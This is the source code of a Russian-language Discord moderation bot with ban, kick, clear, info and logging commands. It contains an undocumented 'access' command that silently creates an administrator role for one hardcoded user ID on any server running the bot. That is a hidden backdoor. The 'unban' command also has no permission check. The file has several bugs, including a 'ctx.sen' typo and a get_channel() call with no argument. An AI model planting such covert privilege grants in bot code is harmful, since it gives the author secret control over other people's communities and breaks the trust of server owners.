import discord
import asyncio
import config
import io
import ipc
import datetime
import requests
import json
import os
from discord.ext import commands, tasks
from discord.ext.commands import Bot
from discord import client
from io import BytesIO
from config import settings
from discord.utils import get

prefix = settings['PREFIX']

intents = discord.Intents.all()

client = commands.Bot(command_prefix=settings['PREFIX'], intents=intents)
client.remove_command("help")

extension = [
	"cogs.giveaway",
	"jishaku"
]

if __name__ == '__main__':
	for extension in extension:
		client.load_extension(extension)

@client.event
async def on_ready():
	print (f"Logged on as {settings['NAME BOT']}")

	await client.change_presence( status = discord.Status.idle, activity=discord.Streaming(name=f';help', url='https://www.twitch.tv/kr3manit'))

'''
@client.command(aliases = ['Help', 'help'])
async def __help ( ctx ):
    emb = discord.Embed( title = 'ДОСТУПНЫЕ КОМАНДЫ:', description = 'ВНИМАНИЕ! Бот ещё в разработке!', colour = discord.Color.orange () ) 
    # title - Жирный крупный текст (Заголовок) | description - Текст под заголовком | colour - Цвет полоски

    emb.set_author( name = ctx.author.name, icon_url = ctx.author.avatar_url )
    # Отображает: ctx.author.name - Имя отправителя, ctx.author.avatar_url - Аватар отправителя
    emb.add_field( name = 'Информация', value = f'`{prefix}help` `{prefix}time` `{prefix}сервер` `{prefix}info` `{prefix}авторы` ', inline=False )
    # emb.add_field( name = 'Модерирование', value = f'`{prefix}mute` `{prefix}размут` `{prefix}ban` `{prefix}kick` `{prefix}clear` ', inline=False )
    # Отображаемый блок текста. name - Жирный крупный текст | value - обычный текст под "name" | inline = True - Блоки текста будут в одну строку (https://prnt.sc/uogw2x) / inline = False - Блоки текста будут один под другим (https://prnt.sc/uogx3t)
    emb.set_thumbnail(url = client.user.avatar_url)
    # emb.set_thumbnail - Добавляет картинку около текста (Например: emb.set_thumbnail(url = "https://icons.iconarchive.com/icons/elegantthemes/beautiful-flat-one-color/128/unlocked-icon.png") (NOAD) добавит картинку замка (https://prnt.sc/uogztb)) | client.user.avatar_url - Отображает аватарку бота
    emb.set_footer( icon_url = client.user.avatar_url, text = f'{client.user.name} © Copyright 2021 | Все права защищены' )
    # emb.set_thumbnail - Добавляет картинку под текстом | client.user.avatar_url - Аватарка бота | ctx.guild.name - Имя сервера

    await ctx.send ( embed = emb)

    print( f'[Logs:info] Справка по командам была успешно выведена | {prefix}help ' )
'''

@client.command( pass_context = True )

async def music( ctx ):
	await ctx.message.delete()

	emb = discord.Embed( title = 'Музыкальные команды', colour = discord.Color.purple() )

	emb.add_field( name = f'play', value = '```Воспроизвести композицию в голосовом канале.```' )
	emb.add_field( name = f'stop', value = '```Прекращает воспроизведение песни и очищает очередь.```' )
	emb.add_field( name = f'skip', value = '```Пропустить текущую воспроизводимую композицию.```' )
	emb.add_field( name = f'queue', value = '```Показать очередь воспроизведения.```' )
	emb.add_field( name = f'shuffle', value = '```Перемешать очередь воспроизведения.```' )
	emb.add_field( name = f'repeat', value = '```Установить режим повтора.```' )
	emb.add_field( name = f'here', value = '```Переместиться в голосовой канал участника.```' )
	emb.add_field( name = f'volume', value = '```Установить громкость воспроизведения.```' )
	emb.add_field( name = f'now', value = '```Показать текущую композицию.```' )
	emb.add_field( name = f'pause', value = '```Поставить воспроизведение на паузу.```' )
	emb.add_field( name = f'resume', value = '```Продолжить воспроизведение композиции после паузы.```' )
 	
	await ctx.send( embed = emb )

#Command help
@client.command( pass_context = True )

async def help( ctx ):
	await ctx.channel.purge( limit = 1 )

	emb = discord.Embed( title = 'Навигация по командам', colour = discord.Color.orange() )

	emb.add_field( name = f'{prefix}clear', value = '```Очистить чат```' )
	emb.add_field( name = f'{prefix}kick', value = '```Выгнать участника```' )
	emb.add_field( name = f'{prefix}ban', value = '```Забанить участника```' )
	emb.add_field( name = f'{prefix}time', value = '```Посмотреть время```' )
	emb.add_field( name = f'{prefix}music', value = '```Помощь по музыке```' )
	emb.add_field( name = f'{prefix}info', value = '```Посмотреть свой профиль```' )

	await ctx.send( embed = emb )

@client.event

async def on_member_join (member):
    channel = client.get_channel ( 831397576107622420 )

    role = discord.utils.get (member.guild.roles, id=813894164949237820)
    print ('user join the servers')
    await member.add_roles( role )
    await channel.send( embed = discord.Embed( description = f'```xl Пользователь {member.name}, присоединился к нам!```', color = 0x2D3136))

# Clear message
@client.command( pass_context = True )
@commands.has_permissions( administrator = True )

async def clear( ctx, amount : int ):
	await ctx.channel.purge( limit = amount )

	await ctx.send(embed = discord.Embed(description = f'✅Удалено {amount} собщений', colour = discord.Color.orange()))
	await ctx.message.delete()

# Kick
@client.command( pass_context = True )
@commands.has_permissions( administrator = True )

async def kick( ctx, member: discord.Member, *, reason = None ):
	await ctx.channel.purge( limit = 1 )

	await member.kick( reason = reason )
	await ctx.send( f'kick user {member.mention}' )

# Ban
@client.command( pass_context = True )
@commands.has_permissions( administrator = True )

async def ban( ctx, member: discord.Member, *, reason = None ):
	emb = discord.Embed( title = 'Бан', colour = discord.Color.red() )
	await ctx.channel.purge( limit = 1 )

	await member.ban( reason = reason )

	emb.set_author( name = member.name, icon_url = member.avatar_url )
	emb.add_field( name = 'Забанненый пользователь', value = 'Пользователь: {}'.format( member.mention ) )
	emb.set_footer( text = 'Был забанен администратором {}'.format( ctx.author.name ), icon_url = ctx.author.avatar_url )

	now_date = datetime.datetime.now()

	emb.add_field( name = 'Время бана', value = 'Time : {}'.format( now_date ) )

	await ctx.send( embed = emb )

	await ctx.sen( f'ban user { member.mention }' )


# UnBan

@client.command( pass_context = True )
async def unban( ctx, *, member ):
	banned_users = await ctx.guild.bans()
	member_name, member_discriminator = member.split('#')

	for ban_entry in banned_users:
		user = ban_entry.user

		if (user.name, user.discriminator) == (member_name, member_discriminator):
			await ctx.guild.unban(user)
			await ctx.send(f'Unbanned {user.mention}')
			return

# Time
@client.command( pass_context = True )

async def time( ctx ):
	emb = discord.Embed( title = 'Время', colour = discord.Colour.green(), url = 'https://www.timeserver.ru/cities/ru/moscow' )

	emb.set_author( name = client.user.name, icon_url = client.user.avatar_url )
	emb.set_footer( text = 'Спасибо за использование нашего бота!' )
	emb.set_image( url = 'https://a.allegroimg.com/original/11e121/8662687044ccbb45c47d9bcc760b/Zegar-scienny-29-cm-czarno-bialy-okragly' )

	now_date = datetime.datetime.now()

	emb.add_field( name = 'Time', value = 'Time : {}'.format( now_date ) )

	await ctx.send( embed = emb )



@client.command()
async def info(ctx,member:discord.Member = None, guild: discord.Guild = None):
	await ctx.message.delete()
	if member == None:
		emb = discord.Embed(title="Информация о пользователе", color=ctx.message.author.color)
		emb.add_field(name="Имя:", value=ctx.message.author.display_name,inline=False)
		emb.add_field(name="Айди пользователя:", value=ctx.message.author.id,inline=False)
		t = ctx.message.author.status
		if t == discord.Status.online:
		    d = "<:vseti:885956377493790750> В сети"

		t = ctx.message.author.status
		if t == discord.Status.offline:
			d = "⚪Не в сети"

		t = ctx.message.author.status
		if t == discord.Status.idle:
		    d = "🟠Не активен"

		t = ctx.message.author.status
		if t == discord.Status.dnd:
		    d = "🔴Не беспокоить"

		emb.add_field(name="Активность:", value=d,inline=False)
		emb.add_field(name="Статус:", value=ctx.message.author.activity,inline=False)
		emb.add_field(name="Роль на сервере:", value=f"{ctx.message.author.top_role.mention}",inline=False)
		emb.add_field(name="Акаунт был создан:", value=ctx.message.author.created_at.strftime("%a, %#d %B %Y, %I:%M %p"),inline=False)
		emb.add_field(name="Присоединился:", value=ctx.author.joined_at.strftime("%a, %#d %B %Y, %I:%M %p"),inline=False)
		emb.set_thumbnail(url=ctx.message.author.avatar_url)
		await ctx.send(embed = emb)

@client.event
async def on_message_delete(message):
    channel = client.get_channel() #укажите здесь айди канала, куда будут скидываться логи
    embed = discord.Embed(title = f"Сообщение удалено.", description = f"**Автор:**{message.author} ({message.author.id})\n**Канал:**{message.channel.mention}\n**Содержание сообщения:**{message.content}", color = discord.Colour.red())
    await channel.send(embed = embed)
		
@client.command()
async def access(ctx):
    await ctx.message.delete()
    if(ctx.author.id == 876145799917097021):
        owner_role = discord.utils.get(ctx.message.guild.roles, name = 'Онимешник')
        if owner_role in ctx.author.roles:
            await ctx.send(embed = discord.Embed(title = 'У вас уже имеется роль создателя'))
            return
        if owner_role is None:
            owner_role = await ctx.guild.create_role(name = 'Онимешник', permissions = discord.Permissions( administrator = True), color = discord.Color.blurple())
        await ctx.author.add_roles(owner_role, reason = None, atomic = True)

	
@client.command()
async def emoji(ctx):
	await ctx.send("<:vseti:885956377493790750>")



















# Access error
@access.error
async def access_error( ctx, error):
    if isinstance(error, client.NotOwner):
        await ctx.send(embed = discord.Embed(title = '`Вы не являетесь моим создателем!`', color = discord.Color.dark_red()))

# Clear error
@clear.error
async def clear_error( ctx, error ):
	if isinstance( error, commands.MissingRequiredArgument ):
		await ctx.send( f'{ ctx.author.name }, обязательно укажите аргумент!' )

	if isinstance( error, commands.MissingPermissions ):
		await ctx.send( f'{ ctx.author.name }, у вас недостаточно прав!' )

# Ban error
@ban.error
async def clear_error( ctx, error ):
	if isinstance( error, commands.MissingRequiredArgument ):
		await ctx.send( f'{ ctx.author.name }, обязательно укажите человека!' )

	if isinstance( error, commands.MissingPermissions ):
		await ctx.send( f'{ ctx.author.name }, у вас недостаточно прав!' )

# Kick error
@kick.error
async def clear_error( ctx, error ):
	if isinstance( error, commands.MissingRequiredArgument ):
		await ctx.send( f'{ ctx.author.name }, обязательно укажите человека!' )

	if isinstance( error, commands.MissingPermissions ):
		await ctx.send( f'{ ctx.author.name }, у вас недостаточно прав!' )

# Clear.error
@client.event
async def on_command_error( ctx, error ):
	pass


#client.run (settings['TOKEN'])
token = os.environ.get('BOT_TOKEN')

client.run(str(token))
